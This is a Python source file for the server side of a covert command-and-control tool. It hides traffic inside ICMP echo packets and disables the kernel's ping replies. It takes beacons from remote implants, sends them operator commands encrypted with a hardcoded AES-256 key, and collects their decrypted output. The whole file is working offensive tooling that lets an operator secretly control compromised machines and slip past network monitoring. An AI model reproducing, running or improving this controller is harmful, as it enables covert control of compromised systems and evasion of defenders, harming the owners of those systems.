import socket, struct, threading, queue, os, sys, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ── Configuration ─────────────────────────────────────────────────────────────
MAGIC  = b'\xDE\xAD\xBE\xEF'
BEACON, CMD, OUTPUT, ACK = 0x01, 0x02, 0x03, 0x04

# ── AES-256 Key — must match all beacons ─────────────────────────────────────
AES_KEY = bytes([
    0x60, 0x3d, 0xeb, 0x10, 0x15, 0xca, 0x71, 0xbe,
    0x2b, 0x73, 0xae, 0xf0, 0x85, 0x7d, 0x77, 0x81,
    0x1f, 0x35, 0x2c, 0x07, 0x3b, 0x61, 0x08, 0xd7,
    0x2d, 0x98, 0x10, 0xa3, 0x09, 0x14, 0xdf, 0xf4
])

# ── AES helpers ───────────────────────────────────────────────────────────────
def aes_encrypt(data: bytes) -> bytes:
    iv = os.urandom(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(data, 16))

def aes_decrypt(data: bytes) -> bytes:
    try:
        iv, ct = data[:16], data[16:]
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(ct), 16)
    except Exception as e:
        print(f"[ERR] AES decrypt failed: {e}")
        return b''

# ── Protocol ──────────────────────────────────────────────────────────────────
def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def build_payload(sid: int, mtype: int, data: bytes = b'') -> bytes:
    return MAGIC + struct.pack('!IB', sid, mtype) + struct.pack('!H', len(data)) + data

def parse_payload(data: bytes):
    if len(data) < 11 or data[:4] != MAGIC:
        return None
    sid, mtype = struct.unpack('!IB', data[4:9])
    dlen = struct.unpack('!H', data[9:11])[0]
    if len(data) < 11 + dlen:
        return None
    return sid, mtype, data[11:11+dlen]

def build_icmp_reply(icmp_id: int, icmp_seq: int, payload: bytes) -> bytes:
    hdr  = struct.pack('!BBHHH', 0, 0, 0, icmp_id, icmp_seq)
    csum = checksum(hdr + payload)
    hdr  = struct.pack('!BBHHH', 0, 0, csum, icmp_id, icmp_seq)
    return hdr + payload

# ── Session ───────────────────────────────────────────────────────────────────
class Session:
    def __init__(self, sid: int, ip: str):
        self.sid       = sid
        self.ip        = ip
        self.cmd_q     = queue.Queue()
        self.history   = []  # list of plain output strings
        self.last_seen = time.time()

# ── Server ────────────────────────────────────────────────────────────────────
class ICMPServer:
    def __init__(self):
        ret = os.system('sysctl -w net.ipv4.icmp_echo_ignore_all=1')
        if ret != 0:
            print("[!] Warning: could not disable kernel ICMP echo — run as root")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        self.sock.bind(('0.0.0.0', 0))
        self.sessions: dict[int, Session] = {}
        self.active: int | None = None
        self.lock = threading.Lock()

    def _restore_icmp(self):
        os.system('sysctl -w net.ipv4.icmp_echo_ignore_all=0')
        print("\n[*] Kernel ICMP echo restored.")

    def _handle(self, raw: bytes, src_ip: str):
        ip_hdr_len = (raw[0] & 0x0F) * 4
        icmp = raw[ip_hdr_len:]

        if icmp[0] != 8:
            return

        icmp_id  = struct.unpack('!H', icmp[4:6])[0]
        icmp_seq = struct.unpack('!H', icmp[6:8])[0]
        parsed   = parse_payload(icmp[8:])
        if not parsed:
            return

        sid, mtype, data = parsed

        with self.lock:
            if sid not in self.sessions:
                self.sessions[sid] = Session(sid, src_ip)
                print(f"\n[+] New session {sid:08X} from {src_ip}")
                print("C2> ", end='', flush=True)

            sess = self.sessions[sid]
            sess.last_seen = time.time()

            if mtype == BEACON:
                if not sess.cmd_q.empty():
                    cmd = sess.cmd_q.get()
                    encrypted_cmd = aes_encrypt(cmd.encode())
                    reply_p = build_payload(sid, CMD, encrypted_cmd)
                    print(f"\n[*] Sending CMD to {sid:08X}: {cmd}")
                    print("C2> ", end='', flush=True)
                else:
                    reply_p = build_payload(sid, ACK)

            elif mtype == OUTPUT:
                decrypted = aes_decrypt(data)
                if decrypted:
                    out = decrypted.decode('utf-8', errors='replace')
                else:
                    out = "[decryption failed]\n"
                sess.history.append(out)  # store plain string
                print(f"\n[OUTPUT {sid:08X}]\n{out}")
                print("C2> ", end='', flush=True)
                reply_p = build_payload(sid, ACK)
            else:
                reply_p = build_payload(sid, ACK)

        reply = build_icmp_reply(icmp_id, icmp_seq, reply_p)
        self.sock.sendto(reply, (src_ip, 0))

    def _listen(self):
        while True:
            try:
                raw, addr = self.sock.recvfrom(65535)
                threading.Thread(target=self._handle, args=(raw, addr[0]), daemon=True).start()
            except Exception:
                pass

    def run(self):
        threading.Thread(target=self._listen, daemon=True).start()
        print("[*] ICMP C2 active (AES-256-CBC) | Commands: sessions | use <hex_id> | history | <cmd>")

        try:
            while True:
                try:
                    line = input("C2> ").strip()
                except EOFError:
                    break

                if not line:
                    continue

                if line == "sessions":
                    with self.lock:
                        if not self.sessions:
                            print("  No sessions.")
                        for s in self.sessions.values():
                            marker = "*" if s.sid == self.active else " "
                            ts = time.strftime('%H:%M:%S', time.localtime(s.last_seen))
                            print(f"  [{marker}] {s.sid:08X}  {s.ip:<16}  last: {ts}")

                elif line.startswith("use "):
                    try:
                        sid = int(line.split()[1], 16)
                        with self.lock:
                            if sid in self.sessions:
                                self.active = sid
                                print(f"[*] Active session: {sid:08X}")
                            else:
                                print("[-] Session not found.")
                    except (ValueError, IndexError):
                        print("[-] Usage: use <hex_id>")

                elif line == "history":
                    with self.lock:
                        if not self.active or self.active not in self.sessions:
                            print("[-] No active session, use: use <hex_id>")
                        else:
                            sess = self.sessions[self.active]
                            if not sess.history:
                                print("  No history.")
                            else:
                                for i, entry in enumerate(sess.history, 1):
                                    print(f"  [{i}]")
                                    print(f"  {entry.rstrip()}")
                                    print()

                else:
                    with self.lock:
                        targets = (
                            [self.sessions[self.active]]
                            if self.active and self.active in self.sessions
                            else list(self.sessions.values())
                        )
                        for s in targets:
                            s.cmd_q.put(line)
                        print(f"[*] Queued for {len(targets)} session(s)")
        finally:
            self._restore_icmp()

if __name__ == '__main__':
    if os.geteuid() != 0:
        sys.exit("[-] Requires root.")
    ICMPServer().run()
